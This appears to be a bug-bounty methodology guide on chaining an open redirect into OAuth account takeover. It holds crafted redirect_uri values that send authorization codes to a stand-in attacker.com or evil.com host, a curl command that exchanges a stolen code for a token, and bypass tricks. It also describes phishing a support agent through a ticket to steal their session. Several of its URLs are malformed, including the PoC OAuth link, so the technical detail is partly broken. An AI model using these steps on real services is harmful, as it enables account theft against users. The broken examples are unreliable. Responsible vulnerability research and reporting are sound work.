Open Redirect to OAuth Account Takeover
Why This Chain Works
An open redirect by itself gets closed as informational half the time. But if the target uses OAuth and you can redirect the redirect_uri through your open redirect, you can steal authorization codes. The OAuth server trusts the registered domain. You're not bypassing that trust, you're routing through it.

Attack Flow
graph TD
    A[Find Open Redirect on target.com] --> B[Identify OAuth login flow]
    B --> C[Locate redirect_uri parameter in auth request]
    C --> D{Is redirect_uri validated by allowlist or prefix?}
    D -->|Prefix match only| E[Craft: redirect_uri=target.com/redirect://attacker.com]
    D -->|Exact match| F[Look for open redirects on registered redirect_uri domain]
    E --> G[Send crafted OAuth link to victim]
    F --> G
    G --> H[Victim clicks, authenticates normally]
    H --> I[OAuth server redirects to target.com/redirect with ?code=AUTH_CODE]
    I --> J[target.com bounces victim to attacker.com with code in URL]
    J --> K[Attacker's server logs the code in Referer or URL params]
    K --> L[Exchange code for access token at token endpoint]
    L --> M[Full account access, ATO confirmed]


Step-by-Step
1. Find the Open Redirect
Look for these patterns on the target domain:

?redirect=, ?next=, ?url=, ?return_to=, ?continue=
Post-login redirect parameters
3rd-party SSO return URLs

Test with target.com/redirect://attacker.com and confirm you get a 302 to attacker.com. You need a confirmed, reliable redirect on a domain registered in the OAuth app's allowed list.
2. Map the OAuth Flow
Intercept a normal login. Find the authorization request:
GET /oauth/authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=target.com/callback
  &scope=openid profile
  &state=RANDOM_STATE
Note the exact redirect_uri value. That's your target.
3. Craft the Malicious redirect_uri
Replace the registered redirect_uri with your open redirect chain:
redirect_uri=target.com/redirect://attacker.com/catch
The OAuth server sees target.com/... which matches the registered domain. It doesn't parse the nested URL.
4. Send to Victim
Build the full authorization URL with your crafted redirect_uri and send it to the victim (phishing, link in a public post, etc.). When they authenticate, the server issues the code and redirects to:
target.com/redirect://attacker.com/catch&code=AUTH_CODE&state=STATE
target.com then redirects to:
attacker.com/catch
Your server logs it. The Referer header on subsequent requests from your page will also contain it.
5. Exchange the Code
curl -X POST target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "redirect_uri=target.com/redirect://attacker.com/catch" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"
You get back an access token. Log in as the victim.

Validation Bypass Tricks

Prefix match bypass: If the server checks startsWith("target.com"), use target.com.attacker.com (if they're sloppy) or chain through a legit open redirect on target.com.
Path traversal: target.com/callback/../redirect
Fragment abuse: Some flows pass the code in the fragment; test redirect_uri=attacker.com with a page that reads location.hash.
Registered subdomain: If sub.target.com is registered and you find an open redirect there, that works too.


Real-World Scenario
You're hunting on a SaaS platform. They use "Login with Google." The OAuth callback is app.target.com/auth/callback. You find app.target.com/go://evil.com is a working open redirect. The Google OAuth app has app.target.com registered as an allowed redirect prefix. You chain them, send a crafted link to a support ticket, and when the support agent clicks it, you have their session.

PoC Template
Crafted URL:
accounts.google.com/o/oauth2/auth://target.com/go%3Fto%3Dhttps%3A%2F%2Fattacker.com%2Fcatch&response_type=code&scope=openid+email
 
Attacker server (attacker.com/catch): log all incoming query params and Referer headers.

Reporting Notes
Report the open redirect and the OAuth ATO together as a single chain. Severity is the ATO severity, not the open redirect severity. Show the full PoC including the code exchange step. Triagers need to see the token in hand, not just the redirect.
